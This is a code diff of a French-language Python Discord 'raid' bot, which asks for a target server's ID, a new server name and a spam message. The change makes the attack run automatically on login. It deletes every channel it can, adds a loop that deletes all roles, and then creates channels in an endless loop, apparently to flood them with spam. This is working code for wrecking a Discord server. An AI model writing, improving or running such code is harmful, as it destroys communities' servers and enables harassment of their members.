@@ -34,9 +34,8 @@ idserveur = input(Fore.BLUE + Style.NORMAL + "Id du serveur a raid: ")
 nomserveur = input(Fore.BLUE + Style.NORMAL + "Nouveau nom du serveur: ")
 nomchannel = input(Fore.BLUE + Style.NORMAL + "Nom des channel: ")
 messagespam = input(Fore.BLUE + Style.NORMAL + "Message a spam dans les channel: ")
-prefix = input(Fore.BLUE + Style.NORMAL + "Prefix de votre bot: ")
 
-bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
+bot = commands.Bot(command_prefix="+", intents=discord.Intents.all())
 
 @bot.event
 async def on_ready():
@@ -52,9 +51,6 @@ async def on_ready():
 	 |____/ \___/ |_|   |_____|_| \_| |_|  |_/_/   \_\_| \_\\____|_| |_|_____|
 	                                                                          
 		                 """+ Fore.RED + Style.NORMAL + "ROUGE = Channel supprimé\n"+ Fore.GREEN + Style.NORMAL + "                                  VERT = role supprimé\n"+ Fore.BLUE + Style.NORMAL + Fore.CYAN + Style.NORMAL + "                                  CYAN = role supprimé\n"+ Fore.BLUE + Style.NORMAL +"LOGS:\n")
-
-@bot.command()
-async def raid(ctx):
 	guild = bot.get_guild(int(idserveur))
 	
 	try:
@@ -68,6 +64,12 @@ async def raid(ctx):
 			print(Fore.RED + Style.NORMAL + "Channel: "+channel.name+" supprimé")
 		except:
 			print(Fore.CYAN + Style.NORMAL + "Erreur: Impossible de supprimé le channel: "+channel.name)
+	
+	for role in guild.roles:
+		try:
+			await role.delete()
+		except:
+			print(Fore.CYAN + Style.NORMAL + "Erreur: Impossible de supprimé le role: "+role.name)
 	
 	while True:
 		channel = await guild.create_text_channel(nomchannel)
